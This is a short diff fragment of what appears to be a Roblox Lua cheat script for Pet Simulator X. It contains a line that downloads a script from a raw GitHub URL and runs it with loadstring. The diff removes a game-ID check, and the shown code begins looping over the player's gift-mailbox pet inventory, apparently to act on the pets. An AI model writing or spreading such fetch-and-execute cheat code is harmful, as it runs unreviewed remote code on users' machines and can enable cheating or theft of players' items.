@@ -43,7 +43,8 @@
     
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperMonz/Psx_Sc/main/Petsimguiss", true))()
 
-if game.PlaceId == 6284583030 or 7722306047 or 10321372166 or 12610002282 or 11725212117 then
+
+
 local Exclusive = 0
 
 for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
